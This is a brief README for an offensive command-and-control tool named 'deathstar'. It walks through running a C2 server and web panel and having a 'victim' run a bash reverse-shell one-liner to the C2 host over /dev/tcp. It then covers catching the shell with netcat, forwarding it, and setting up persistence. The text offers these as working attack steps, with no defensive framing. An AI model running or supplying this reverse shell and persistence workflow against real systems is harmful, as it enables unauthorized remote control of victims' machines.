# deathstar
Build and understand c2 infrastructure

![screen](https://github.com/user-attachments/assets/7de184fa-cd0b-4cbf-b701-9f505a77cb2a)

# Download deathstar

```git clone github.com/bwithe/deathstar```

# Start C2
`python3 deathstar.py`

# Open link in web browser

```firefox 127.0.0.1:5000```

# Have Victim connect to C2 
Linux / MacOS

`bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`

# Start your listener 
`nc -nvlp 4444`

# Forward the connection to another listener
On the webpage, type the IP of the listening device, and then click forward.

# Catch the connection
Once you've caught the connection, begin setting up persistence.


Wash, rince, repeat.

